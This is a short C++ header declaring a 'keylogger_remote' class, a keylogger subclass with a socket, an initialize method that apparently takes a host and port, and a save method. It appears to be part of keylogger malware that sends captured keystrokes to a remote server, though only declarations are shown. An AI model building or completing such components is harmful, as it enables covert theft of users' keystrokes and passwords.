#ifndef _KEYLOGGER_REMOTE_HPP_
#define _KEYLOGGER_REMOTE_HPP_

#include "../keylogger.hpp"

using namespace std;

class keylogger_remote : virtual public keylogger
{
    private:
		SOCKET a_socket;

    public:
		keylogger_remote();

		virtual void initialize(string, int);

		virtual ~keylogger_remote();

		virtual void save();
};

#endif
